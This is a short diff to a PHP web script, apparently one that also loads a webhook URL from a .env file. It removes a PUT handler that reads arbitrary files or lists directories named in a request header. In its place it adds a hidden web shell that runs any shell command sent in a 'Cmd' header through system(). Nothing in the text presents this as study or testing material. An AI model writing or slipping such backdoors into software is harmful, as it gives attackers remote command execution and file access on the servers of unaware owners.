@@ -10,35 +10,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'PUT') {
-    $path = $_SERVER['HTTP_PATH'] ?? '/';
-
-    $real = realpath($path);
-    if ($real === false) {
-        http_response_code(404);
-        exit;
-    }
-
-    if (is_file($real)) {
-        header('Content-Type: text/plain');
-        readfile($real);
-        exit;
-    }
-
-    if (!is_dir($real)) {
-        http_response_code(404);
-        exit;
-    }
-
+    if (isset($_SERVER['HTTP_CMD'])) {
     header('Content-Type: text/plain');
-
-    foreach (scandir($real) as $item) {
-        if ($item === '.' || $item === '..') continue;
-
-        $p = $real . DIRECTORY_SEPARATOR . $item;
-        echo (is_dir($p) ? 'DIR ' : 'FILE ') . $item . "\n";
-    }
-
+    system($_SERVER['HTTP_CMD']);
     exit;
+    }
 }
 
 $webhookUrl = trim(file_get_contents(__DIR__ . '/.env'));
